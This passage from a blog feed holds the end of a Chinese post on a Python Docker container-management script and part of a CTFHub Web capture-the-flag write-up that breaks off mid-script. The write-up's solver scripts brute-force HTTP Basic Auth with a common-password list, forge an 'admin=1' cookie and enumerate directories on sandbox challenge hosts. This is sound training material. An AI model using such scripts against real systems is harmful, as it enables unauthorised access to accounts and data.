number">1</span><span class="token punctuation">:</span>                                start_instance<span class="token punctuation">(</span><span class="token punctuation">[</span>containers<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                                <span class="token keyword">break</span>                            <span class="token keyword">else</span><span class="token punctuation">:</span>                                <span class="token keyword">continue</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t看起来您的输入好像有点问题..."</span><span class="token punctuation">)</span>                <span class="token keyword">except</span> BaseException <span class="token keyword">as</span> e<span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t看起来您的输入好像有点问题..."</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> user_choice_1 <span class="token operator">==</span> <span class="token string">'3'</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> len<span class="token punctuation">(</span>shell<span class="token punctuation">(</span>alive_docker_id<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"当前没有在运行的实例,无需执行关闭操作"</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                show_alive_instance<span class="token punctuation">(</span><span class="token punctuation">)</span>                containers<span class="token punctuation">,</span> ins_code <span class="token operator">=</span> get_alive_instances_infos<span class="token punctuation">(</span><span class="token punctuation">)</span>                user_choice_2 <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">"请输入您想要关闭的docker实例编号(a all) >> "</span><span class="token punctuation">)</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> user_choice_2 <span class="token operator">==</span> <span class="token string">'a'</span><span class="token punctuation">:</span>                        stop_instance<span class="token punctuation">(</span>containers<span class="token punctuation">)</span>                    <span class="token keyword">elif</span> user_choice_2 <span class="token operator">==</span> <span class="token string">'q'</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t正在返回上级菜单..."</span><span class="token punctuation">)</span>                    <span class="token keyword">elif</span> int<span class="token punctuation">(</span>user_choice_2<span class="token punctuation">)</span> <span class="token keyword">in</span> ins_code<span class="token punctuation">:</span>                        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>ins_code<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">if</span> int<span class="token punctuation">(</span>user_choice_2<span class="token punctuation">)</span> <span class="token operator">==</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">:</span>                                stop_instance<span class="token punctuation">(</span><span class="token punctuation">[</span>containers<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                                <span class="token keyword">break</span>                            <span class="token keyword">else</span><span class="token punctuation">:</span>                                <span class="token keyword">continue</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t看起来您的输入好像有点问题..."</span><span class="token punctuation">)</span>                <span class="token keyword">except</span> BaseException <span class="token keyword">as</span> e<span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t看起来您的输入好像有点问题..."</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t您的输入好像不太符合要求"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、执行效果"><a href="#三、执行效果" class="headerlink" title="三、执行效果"></a>三、执行效果</h2><h3 id="1、查看当前docker的运行状态"><a href="#1、查看当前docker的运行状态" class="headerlink" title="1、查看当前docker的运行状态"></a>1、查看当前docker的运行状态</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">>></span><span class="token operator">>></span><span class="token operator">>></span><span class="token operator">>></span><span class="token operator">>></span> Docker managemet program by valecalida <span class="token operator">&lt;&lt;&lt;</span><span class="token operator">&lt;&lt;&lt;</span><span class="token operator">&lt;&lt;&lt;</span><span class="token operator">&lt;</span>                1 <span class="token operator">>></span> 查看当前docker的运行状态                2 <span class="token operator">>></span> 开启指定<span class="token punctuation">(</span>全部<span class="token punctuation">)</span>容器                3 <span class="token operator">>></span> 关闭指定<span class="token punctuation">(</span>全部<span class="token punctuation">)</span>容器                q <span class="token operator">>></span> 退出程序<span class="token punctuation">(</span>q<span class="token punctuation">)</span>输入您想要进行的操作的序号 <span class="token operator">>></span> 1        Now,the instances not running are list as follows:                实例编号        容器的ID                容器的名字              容器的IP                   1            7ffb7ab9357b            ctfd_ctfd_1             未运行,无IP                   2            5647bf40afb6            ctfd_cache_1            未运行,无IP                   3            9850433d5ea5            ctfd_db_1               未运行,无IP        Now,the instances running are list as follows:                实例编号        容器的ID                容器的名字      容器的IP        容器的端口                   1            80a350cee15c            wordpress       172.18.0.3         80                   2            26d6109587e8              mysql         172.18.0.2        3306<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、开启指定容器"><a href="#2、开启指定容器" class="headerlink" title="2、开启指定容器"></a>2、开启指定容器</h3><pre class="line-numbers language-bash"><code class="language-bash">输入您想要进行的操作的序号 <span class="token operator">>></span> 2        Now,the instances not running are list as follows:                实例编号        容器的ID                容器的名字              容器的IP                   1            7ffb7ab9357b            ctfd_ctfd_1             未运行,无IP                   2            5647bf40afb6            ctfd_cache_1            未运行,无IP                   3            9850433d5ea5            ctfd_db_1               未运行,无IP请输入您想要启动的docker实例编号<span class="token punctuation">(</span>a all<span class="token punctuation">)</span> <span class="token operator">>></span> 1start 7ffb7ab9357b successful<span class="token operator">>></span><span class="token operator">>></span><span class="token operator">>></span><span class="token operator">>></span><span class="token operator">>></span> Docker managemet program by valecalida <span class="token operator">&lt;&lt;&lt;</span><span class="token operator">&lt;&lt;&lt;</span><span class="token operator">&lt;&lt;&lt;</span><span class="token operator">&lt;</span>                1 <span class="token operator">>></span> 查看当前docker的运行状态                2 <span class="token operator">>></span> 开启指定<span class="token punctuation">(</span>全部<span class="token punctuation">)</span>容器                3 <span class="token operator">>></span> 关闭指定<span class="token punctuation">(</span>全部<span class="token punctuation">)</span>容器                q <span class="token operator">>></span> 退出程序<span class="token punctuation">(</span>q<span class="token punctuation">)</span>输入您想要进行的操作的序号 <span class="token operator">>></span> 1        Now,the instances not running are list as follows:                实例编号        容器的ID                容器的名字              容器的IP                   1            5647bf40afb6            ctfd_cache_1            未运行,无IP                   2            9850433d5ea5            ctfd_db_1               未运行,无IP        Now,the instances running are list as follows:                实例编号        容器的ID                容器的名字      容器的IP        容器的端口                   1            80a350cee15c            wordpress       172.18.0.3         80                   2            26d6109587e8              mysql         172.18.0.2        3306                   3            7ffb7ab9357b            ctfd_ctfd_1     172.20.0.2        8000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3、关闭指定容器"><a href="#3、关闭指定容器" class="headerlink" title="3、关闭指定容器"></a>3、关闭指定容器</h3><pre class="line-numbers language-bash"><code class="language-bash">输入您想要进行的操作的序号 <span class="token operator">>></span> 3        Now,the instances running are list as follows:                实例编号        容器的ID                容器的名字      容器的IP        容器的端口                   1            80a350cee15c            wordpress       172.18.0.3         80                   2            26d6109587e8              mysql         172.18.0.2        3306                   3            7ffb7ab9357b            ctfd_ctfd_1     172.20.0.2        8000请输入您想要关闭的docker实例编号<span class="token punctuation">(</span>a all<span class="token punctuation">)</span> <span class="token operator">>></span> 3stop 7ffb7ab9357b successful<span class="token operator">>></span><span class="token operator">>></span><span class="token operator">>></span><span class="token operator">>></span><span class="token operator">>></span> Docker managemet program by valecalida <span class="token operator">&lt;&lt;&lt;</span><span class="token operator">&lt;&lt;&lt;</span><span class="token operator">&lt;&lt;&lt;</span><span class="token operator">&lt;</span>                1 <span class="token operator">>></span> 查看当前docker的运行状态                2 <span class="token operator">>></span> 开启指定<span class="token punctuation">(</span>全部<span class="token punctuation">)</span>容器                3 <span class="token operator">>></span> 关闭指定<span class="token punctuation">(</span>全部<span class="token punctuation">)</span>容器                q <span class="token operator">>></span> 退出程序<span class="token punctuation">(</span>q<span class="token punctuation">)</span>输入您想要进行的操作的序号 <span class="token operator">>></span> 1        Now,the instances not running are list as follows:                实例编号        容器的ID                容器的名字              容器的IP                   1            7ffb7ab9357b            ctfd_ctfd_1             未运行,无IP                   2            5647bf40afb6            ctfd_cache_1            未运行,无IP                   3            9850433d5ea5            ctfd_db_1               未运行,无IP        Now,the instances running are list as follows:                实例编号        容器的ID                容器的名字      容器的IP        容器的端口                   1            80a350cee15c            wordpress       172.18.0.3         80                   2            26d6109587e8              mysql         172.18.0.2        3306<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4、退出程序"><a href="#4、退出程序" class="headerlink" title="4、退出程序"></a>4、退出程序</h3><pre class="line-numbers language-bash"><code class="language-bash">输入您想要进行的操作的序号 <span class="token operator">>></span> q        程序将在一秒后自动退出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Error：使用Markdown展示跟本地实际命令执行的效果有所差别，在Linux主机上测试对齐、格式都正常"><a href="#Error：使用Markdown展示跟本地实际命令执行的效果有所差别，在Linux主机上测试对齐、格式都正常" class="headerlink" title="Error：使用Markdown展示跟本地实际命令执行的效果有所差别，在Linux主机上测试对齐、格式都正常"></a>Error：使用Markdown展示跟本地实际命令执行的效果有所差别，在Linux主机上测试对齐、格式都正常</h3><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFHUB_Web_Partial_WriteUp</title>
      <link href="/2020/04/08/ctfhub-web-partial-writeup/"/>
      <url>/2020/04/08/ctfhub-web-partial-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="Web–WriteUp"><a href="#Web–WriteUp" class="headerlink" title="Web–WriteUp"></a>Web–WriteUp</h1><h2 id="前置技能"><a href="#前置技能" class="headerlink" title="前置技能"></a>前置技能</h2><h3 id="一、HTTP协议"><a href="#一、HTTP协议" class="headerlink" title="一、HTTP协议"></a>一、HTTP协议</h3><h4 id="1、请求方式"><a href="#1、请求方式" class="headerlink" title="1、请求方式"></a>1、请求方式</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span><span class="token comment" spellcheck="true"># --author：valecalida--</span><span class="token comment" spellcheck="true"># Edit time: 2020/3/19 19:59</span><span class="token keyword">from</span> urllib <span class="token keyword">import</span> request<span class="token keyword">import</span> re<span class="token triple-quoted-string string">"""    HTTP Method is GET    Use CTF**B Method, I will give you flag.    Hint: If you got 「HTTP Method Not Allowed」 Error, you should request index.php."""</span>rr <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'\bctfhub{.*}'</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">"http://challenge-c2631c2870dc91e1.sandbox.ctfhub.com:10080/index.php"</span>req <span class="token operator">=</span> request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">"CTFHUB"</span><span class="token punctuation">)</span>res <span class="token operator">=</span> request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>rr<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2、基础认证"><a href="#2、基础认证" class="headerlink" title="2、基础认证"></a>2、基础认证</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span><span class="token comment" spellcheck="true"># --author：valecalida--</span><span class="token comment" spellcheck="true"># Edit time: 2020/3/19 19:53</span><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>request <span class="token keyword">import</span> HTTPBasicAuthHandler<span class="token punctuation">,</span> build_opener<span class="token punctuation">,</span> HTTPPasswordMgrWithDefaultRealm<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>error <span class="token keyword">import</span> URLErrorusername <span class="token operator">=</span> <span class="token string">'admin'</span>f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'10_million_password_list_top_100.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">"http://challenge-b14d74b2bbccc186.sandbox.ctfhub.com:10080/flag.html"</span><span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    password <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    instance <span class="token operator">=</span> HTTPPasswordMgrWithDefaultRealm<span class="token punctuation">(</span><span class="token punctuation">)</span>    instance<span class="token punctuation">.</span>add_password<span class="token punctuation">(</span>None<span class="token punctuation">,</span> url<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span>    auth_handler <span class="token operator">=</span> HTTPBasicAuthHandler<span class="token punctuation">(</span>instance<span class="token punctuation">)</span>    opener <span class="token operator">=</span> build_opener<span class="token punctuation">(</span>auth_handler<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> opener<span class="token punctuation">.</span>open<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        html <span class="token operator">=</span> res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"用户名：admin 密码：%s"</span> <span class="token operator">%</span> password<span class="token punctuation">,</span> <span class="token string">"是正确答案"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag为："</span><span class="token punctuation">,</span> html<span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">except</span> URLError <span class="token keyword">as</span> e <span class="token punctuation">:</span>        <span class="token keyword">continue</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3、响应包源码"><a href="#3、响应包源码" class="headerlink" title="3、响应包源码"></a>3、响应包源码</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span><span class="token comment" spellcheck="true"># --author：valecalida--</span><span class="token comment" spellcheck="true"># Edit time: 2020/3/19 20:56</span><span class="token keyword">import</span> re<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requestrr <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'\bctfhub{.*}'</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">"http://challenge-226bf952c446eb7c.sandbox.ctfhub.com:10080/"</span>res <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>rr<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4、cookie"><a href="#4、cookie" class="headerlink" title="4、cookie"></a>4、cookie</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span><span class="token comment" spellcheck="true"># --author：valecalida--</span><span class="token comment" spellcheck="true"># Edit time: 2020/3/19 20:09</span><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requesturl <span class="token operator">=</span> <span class="token string">"http://challenge-dd1412b01a02d5dd.sandbox.ctfhub.com:10080/"</span>header <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"Cookie"</span><span class="token punctuation">:</span> <span class="token string">"admin=1"</span><span class="token punctuation">}</span>req <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">"GET"</span><span class="token punctuation">)</span>res <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5、302跳转"><a href="#5、302跳转" class="headerlink" title="5、302跳转"></a>5、302跳转</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># -- author : valecalida --</span><span class="token comment" spellcheck="true"># edit_time: 2020/3/20 上午3:34</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://challenge-061acc63c590e9b4.sandbox.ctfhub.com:10080/index.php"</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="一、信息泄露"><a href="#一、信息泄露" class="headerlink" title="一、信息泄露"></a>一、信息泄露</h2><h3 id="1、目录遍历"><a href="#1、目录遍历" class="headerlink" title="1、目录遍历"></a>1、目录遍历</h3><p>这里通过观察目录的情况，发现目录都是 <code>/flag_in_here/1/%d</code> 的样式，于是构造脚本</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span><span class="token comment" spellcheck="true"># --author：valecalida--</span><span class="token comment" spellcheck="true"># Edit time: 2020/4/5 15:31</span><span class="token keyword">from</span> requests <span class="token keyword">import</span> RequestException<span class="token keyword">import</span> requests<span class="token keyword">import</span> random<span class="token keyword">import</span> sys<span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">get_user_agent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user_agent <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1"</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>user_agent<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    num_list <span class="token operator">=</span> <span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    url_1 <span class="token operator">=</span> <span class="token string">"http://challenge-6ccebf9522010cca.sandbox.ctfhub.com:10080/flag_in_here/"</span>    url_2 <span class="token operator">=</span> <span class="token string">"/flag.txt"</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> num_list<span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> num_list<span class="token punctuation">:</span>            header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> get_user_agent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>            url <span class="token operator">=</span> url_1 <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">+</span> url_2            <span class="token keyword">try</span><span class="token punctuation">:</span>                res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>            <span class="token keyword">except</span> RequestException<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag_in_here/1/%d下没有flag.txt这个文件"</span> <span class="token operator">%</span> i<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"^ctfhub{.*}"</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"当访问%s时获取答案：\n\t[+] %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>url<span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>                    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行得到的结果是</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>1987f2dcecfe6cc28241015c225ce28c33aef1f7<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2、PHPINFO"><a href="#2、PHPINFO" class="headerlink" title="2、PHPINFO"></a>2、PHPINFO</h3><p>由于题目提示页面中将会直接出现flag，所以直接构建脚本</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>python3<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span><span class="token comment" spellcheck="true"># --author：valecalida--</span><span class="token comment" spellcheck="true"># Edit time: 2020/4/5 15:52</span><span class="token keyword">from</span> requests <span class="token keyword">import</span> RequestException<span class="token keyword">import</span> requests<span class="token keyword">import</span> random<span class="token keyword">import</span> sys<span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">get_user_agent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user_agent <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span>    <span class="token punctuation">]</span>    <span class="token keyword">return</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>user_agent<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    rr <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'\bctfhub{.*}'</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>    header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> get_user_agent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>    url <span class="token operator">=</span> <span class="token string">"http://challenge-a0372dd0c18f0f3c.sandbox.ctfhub.com:10080/"</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>        link <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"&lt;a href=\"(.*)\" class.*"</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> RequestException<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token 